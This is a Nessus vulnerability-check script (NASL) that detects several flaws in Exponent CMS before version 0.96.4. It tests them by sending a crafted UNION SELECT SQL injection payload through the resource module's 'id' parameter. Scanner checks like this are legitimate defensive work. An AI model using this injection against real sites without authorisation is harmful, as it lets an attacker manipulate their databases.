#
# (C) Tenable Network Security
#


if (description) {
  script_id(20211);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-3762", "CVE-2005-3763", "CVE-2005-3764", "CVE-2005-3765", "CVE-2005-3766", "CVE-2005-3767");
  script_bugtraq_id(15389, 15391);

  script_name(english:"Exponent CMS < 0.96.4 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in Exponent CMS < 0.96.4");
 
  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
multiple vulnerabilities. 

Description :

The remote host is running Exponent CMS, an open-source content
management system written in PHP. 

The version of Exponent CMS installed on the remote host fails to
sanitize input to the 'id' parameter of the resource module before
using it in database queries.  An unauthenticated attacker can exploit
this issue to manipulate SQL queries regardless of the setting of
PHP's 'magic_quotes_gpc' variable. 

The application also reportedly fails to sanitize input to the
'parent' module of the navigation module before using that in database
queries if the user is authenticated and acting as an admin and may
allow an authenticated user to upload files with arbitrary PHP code
through its image upload facility and then execute that code on the
remote host subject to the permissions of the web server user id. 

See also :

http://sourceforge.net/tracker/index.php?func=detail&aid=1230208&group_id=118524&atid=681366
http://sourceforge.net/tracker/index.php?func=detail&aid=1230221&group_id=118524&atid=681366
http://sourceforge.net/tracker/index.php?func=detail&aid=1353361&group_id=118524&atid=681366

Solution :

Upgrade to Exponent CMS version 0.96.4 or later. 

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = make_list("/exponent", "/site", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit one of the SQL injection flaws.
  exploit = string(
    # fields from exponent_resourceitem table included by default.
    "UNION SELECT ",
      # id
      "-1,",
      # name
      "'", SCRIPT_NAME, "',",
      # description
      "'Nessus test',",
      # location_data
      "'", 'O:8:"stdClass":3:{s:3:"mod";s:15:"resourcesmodule";s:3:"src";s:20:"@random41940ceb78dbb";s:3:"int";s:0:"";}', "',",
      # file_id - nb: this must exist in exponent_file; 
      #           7 => "files/resourcesmodule/@random41940ceb78dbb"
      "7,",
      # flock_owner - nb: leave 0.
      "0,",
      # approved
      "0,",
      # posted
      "0,",
      # poster
      "0,",
      # edited
      "0,",
      # editor
      "0",
    " /*"
  );
  req = http_get(
    item:string(
      dir, "/index.php?",
      "action=view&",
      "module=resourcesmodule&",
      "id=", urlencode(str:string("0 ", exploit))
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # it looks like Exponent and...
    '<meta name="Generator" content="Exponent Content Management System" />' >< res &&
    # the name field from our request was accepted.
    string("<b>", SCRIPT_NAME, "</b><br />") >< res
  ) {
    security_warning(port);
    exit(0);
  }
}
